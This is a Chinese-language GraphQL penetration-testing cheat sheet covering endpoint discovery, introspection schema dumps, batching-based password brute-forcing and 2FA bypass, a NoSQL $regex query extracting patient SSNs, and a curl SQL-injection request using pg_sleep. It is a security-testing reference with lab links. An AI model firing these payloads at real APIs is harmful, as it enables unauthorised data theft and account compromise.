# GraphQL 注入

> GraphQL 是一种用于 API 的查询语言和一个使用现有数据满足这些查询的运行时。通过在类型上定义类型和字段，并为每个类型的每个字段提供函数来创建 GraphQL 服务。

## 概要

- [工具](#工具)
- [枚举](#枚举)
    - [常见的 GraphQL 端点](#常见的-graphql-端点)
    - [识别注入点](#识别注入点)
    - [通过内省枚举数据库模式](#通过内省枚举数据库模式)
    - [通过建议枚举数据库模式](#通过建议枚举数据库模式)
    - [枚举类型定义](#枚举类型定义)
    - [列出到达类型的不同路径](#列出到达类型的不同路径)
- [方法论](#方法论)
    - [提取数据](#提取数据)
    - [使用边/节点提取数据](#使用边节点提取数据)
    - [使用投影提取数据](#使用投影提取数据)
    - [突变](#突变)
    - [GraphQL 批量攻击](#graphql-batch-攻击)
        - [基于 JSON 列表的批量处理](#基于-json-list-的批量处理)
        - [基于查询名称的批量处理](#基于-query-name-的批量处理)
- [注入](#注入)
    - [NOSQL 注入](#nosql-注入)
    - [SQL 注入](#sql-注入)
- [实验室](#实验室)
- [参考](#参考)

## 工具

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - 用于渗透测试目的与 GraphQL 端点交互的脚本引擎
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL 安全研究材料
- [doyensec/inql](https://github.com/doyensec/inql) - 用于 GraphQL 安全测试的 Burp 扩展
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - 解析 GraphQL 内省模式并生成可能的查询
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - 列出到达 GraphQL 模式中给定类型的不同方式
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - 用于探索 GraphQL API 的扩展 IDE
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - 即使禁用了内省也能获取 GraphQL API 模式
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - 用于 GraphQL 密码暴力破解和模糊测试的工具
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - 用于安全专业人士研究 GraphQL 实现中安全漏洞的 GraphQL 威胁框架
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - GraphQL API 的安全审计工具
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - 将任何 GraphQL API 表示为交互式图形
- [Insomnia](https://insomnia.rest/) - 跨平台 HTTP 和 GraphQL 客户端

## 枚举

### 常见的 GraphQL 端点

大多数情况下，GraphQL 位于 `/graphql` 或 `/graphiql` 端点。
更完整的列表可以在 [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt) 中找到。

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

### 识别注入点

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

检查错误是否可见。

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### 通过内省枚举数据库模式

URL 编码的查询以转储数据库模式。

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

解码后的查询以转储数据库模式。

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

单行查询以在没有片段的情况下转储数据库模式。

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```js
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### 通过建议枚举数据库模式

当你使用未知的关键字时，GraphQL 后端会响应与其模式相关的建议。

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?"
}
```

你还可以尝试使用词表（如 [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist)）暴力破解已知关键字、字段和类型名，当无法访问 GraphQL API 的模式时。

### 枚举类型定义

使用以下 GraphQL 查询枚举感兴趣的类型定义，将 "User" 替换为所选类型：

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### 列出到达类型的不同路径

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## 方法论

### 提取数据

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

### 使用边/节点提取数据

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### 使用投影提取数据

:warning: 不要忘记在 **options** 中转义 "。

```js
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

### 突变

突变就像函数一样工作，你可以用它们与 GraphQL 进行交互。

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### GraphQL 批量攻击

常见场景：

- 密码暴力破解放大场景
- 绕过速率限制
- 绕过 2FA

#### 基于 JSON 列表的批量处理

> 查询批处理是 GraphQL 的一个功能，允许在单个 HTTP 请求中向服务器发送多个查询。客户端不需要单独发送每个查询，而是可以将查询数组作为一个 POST 请求发送到 GraphQL 服务器。这减少了 HTTP 请求的数量，可以提高应用程序的性能。

查询批处理通过在请求体中定义操作数组来实现。每个操作可以有自己的查询、变量和操作名称。服务器按数组顺序处理每个操作，并返回一个响应数组，每个查询对应一个响应。

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### 基于查询名称的批量处理

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

使用别名多次发送相同的突变

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## 注入

> SQL 和 NoSQL 注入仍然是可能的，因为 GraphQL 只是客户端与数据库之间的中间层。

### NOSQL 注入

在 `search` 参数中使用 `$regex`。

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL 注入

在 GraphQL 参数中发送单引号 `'` 以触发 SQL 注入。

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

在 GraphQL 字段中的简单 SQL 注入。

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## 实验室

- [PortSwigger - 访问私有 GraphQL 帖子](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - 意外暴露私有 GraphQL 字段](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - 查找隐藏的 GraphQL 端点](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - 绕过 GraphQL 暴力破解保护](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - 通过 GraphQL 执行 CSRF 攻击](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - 内省](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - 注入](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - 后端注入](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - 突变](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## 参考

- [构建用于渗透测试的免费开源 GraphQL 词表 - Nohé Hinniger-Foray - 2023 年 8 月 17 日](https://escape.tech/blog/graphql-security-wordlist/)
- [利用 GraphQL - AssetNote - Shubham Shah - 2021 年 8 月 29 日](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL 批量攻击 - Wallarm - 2019 年 12 月 13 日](https://lab.wallarm.com/graphql-batching-attack/)
- [GraphQL 用于渗透测试的演示 - Alexandre ZANNI (@noraj) - 2022 年 12 月 1 日](https://acceis.github.io/prez-graphql/)
- [API 黑客攻击 GraphQL - @ghostlulz - 2019 年 6 月 8 日](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
- [发现 GraphQL 端点和 SQLi 漏洞 - Matías Choren - 2018 年 9 月 23 日](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
- [GraphQL 滥用：通过参数走私绕过帐户级权限 - Jon Bottarini - 2018 年 3 月 14 日](https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [GraphQL 漏洞：窃取任何人地址 - Pratik Yadav - 2019 年 9 月 1 日](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL 速查表 - devhints.io - 2018 年 11 月 7 日](https://devhints.io/graphql)
- [GraphQL 内省 - GraphQL - 2024 年 8 月 21 日](https://graphql.org/learn/introspection/)
- [通过 JSON 类型的 GraphQL NoSQL 注入 - Pete Corey - 2017 年 6 月 12 日](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
- [HIP19 写真集 - Meet Your Doctor 1,2,3 - Swissky - 2019 年 6 月 22 日](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
- [使用 Node.js、Express 和 MongoDB 设置 GraphQL 服务器 - Leonardo Maldonado - 2018 年 11 月 5 日](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
- [GraphQL 入门 - GraphQL - 2024 年 11 月 1 日](https://graphql.org/learn/)
- [内省查询泄露敏感的 GraphQL 系统信息 - @Zuriel - 2017 年 11 月 18 日](https://hackerone.com/reports/291531)
- [从 GraphQL 端点中获利 - @theRaz0r - 2017 年 6 月 8 日](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [通过恶意查询保护 GraphQL API - Max Stoiber - 2018 年 2 月 21 日](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [通过嵌入式提交表单 UUID 参数的 GraphQL 端点 SQL 注入 - Jobert Abma (jobert) - 2018 年 11 月 6 日](https://hackerone.com/reports/435066)